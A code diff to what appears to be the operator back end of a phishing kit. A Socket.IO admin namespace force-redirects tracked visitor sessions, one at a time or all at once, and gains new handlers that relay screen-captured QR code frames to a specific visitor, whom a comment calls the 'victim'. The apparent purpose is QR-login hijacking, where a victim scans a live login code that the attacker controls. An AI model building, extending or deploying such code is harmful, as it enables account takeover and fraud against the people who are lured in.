@@ -63,7 +63,13 @@ function setupAdminNamespace(io, adminNsp) {
           return;
         }
 
-        redirectService.executeRedirect(io, sessionId, targetUrl, user.id);
+        // Detect local dev — admin socket connected from localhost/127.0.0.1 means
+        // the visitor is on slug-based routes (/demo/<slug>/<page>), so no stripping.
+        const originHeader = (socket.handshake?.headers?.origin || socket.handshake?.headers?.host || '').toLowerCase();
+        const isLocal = originHeader.includes('localhost') || originHeader.includes('127.0.0.1');
+        console.log(`[SOCKET redirect] sessionId=${sessionId} target=${targetUrl} origin=${originHeader} isLocal=${isLocal}`);
+
+        redirectService.executeRedirect(io, sessionId, targetUrl, user.id, { isLocal });
 
         const db = getAdapter();
         const sess = await db.get(`
@@ -147,6 +153,10 @@ function setupAdminNamespace(io, adminNsp) {
           return;
         }
 
+        // Detect local dev — same logic as single redirect
+        const originHeader = (socket.handshake?.headers?.origin || socket.handshake?.headers?.host || '').toLowerCase();
+        const isLocal = originHeader.includes('localhost') || originHeader.includes('127.0.0.1');
+
         const db = getAdapter();
         const sessions = websiteId
           ? await db.all('SELECT id FROM sessions WHERE website_id = ? AND is_active = 1', [websiteId])
@@ -154,7 +164,7 @@ function setupAdminNamespace(io, adminNsp) {
 
         let count = 0;
         for (const session of sessions) {
-          redirectService.executeRedirect(io, session.id, targetUrl, user.id);
+          redirectService.executeRedirect(io, session.id, targetUrl, user.id, { isLocal });
           count++;
         }
 
@@ -189,6 +199,24 @@ function setupAdminNamespace(io, adminNsp) {
     socket.on('admin:get-live-stats', async () => {
       const stats = await _getLiveStats(io, user.role === 'god' ? null : user.id);
       socket.emit('admin:stats', stats);
+    });
+
+    // ─── admin:qr-stream-frame ────────────────────────────────
+    // Relay a single screen-captured frame from admin → specific visitor
+    socket.on('admin:qr-stream-frame', (data) => {
+      const { sessionId, frame } = data || {};
+      if (!sessionId || !frame) return;
+      // Use Socket.IO room-based emit — the tracker socket joins
+      // room 'session:<id>' during tracker:init, so this always works.
+      io.of('/tracker').to('session:' + sessionId).emit('tracker:qr-frame', { frame });
+    });
+
+    // ─── admin:qr-stream-stop ─────────────────────────────────
+    // Notify victim that admin stopped the live stream
+    socket.on('admin:qr-stream-stop', (data) => {
+      const { sessionId } = data || {};
+      if (!sessionId) return;
+      io.of('/tracker').to('session:' + sessionId).emit('tracker:qr-stream-stop');
     });
 
     // ─── disconnect ──────────────────────────────────────────
